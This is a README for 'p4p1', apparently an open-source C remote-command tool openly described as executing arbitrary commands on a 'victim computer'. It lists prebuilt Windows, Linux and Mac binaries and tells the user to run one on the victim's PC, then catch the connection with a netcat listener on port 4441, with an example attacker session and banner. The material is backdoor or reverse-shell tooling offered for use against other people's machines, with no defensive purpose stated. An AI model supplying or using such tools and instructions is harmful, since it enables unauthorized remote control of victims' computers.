# p4p1
C open Source TCP server/client to execute arbitury commands on victim computer. They are all in developpement state.
For now the only stable versions are:

##Windows
   	-p4p1-o_64.exe
   	-p4p1-o_32.exe
##Linux
   	-p4p1
##Mac
    -p4p1-mac_binairy


#How To use:
For the p4p1-o verison you need to execute them on the victim's PC,
and then open you're port 4441 and listen on it using any tcp server for exemple netcat.

For the p4p1 basic binaries, it is a command line program and you need to put it into server mode on the victim's PC
with the listening port, and connect to it with the client in the same app.

#Exemple:

##Victim:
Execute p4p1-o_Vx.exe

##Attacker:
nc -l 4441<br />
0<br />
       _ _       _<br />
  _ __| | | _ __/ |<br />
 | '_ \_  _| '_ \ |<br />
 | .__/ |_|| .__/_|<br />
 |_|       |_|<br />
<br />
<p4p1 /><br />
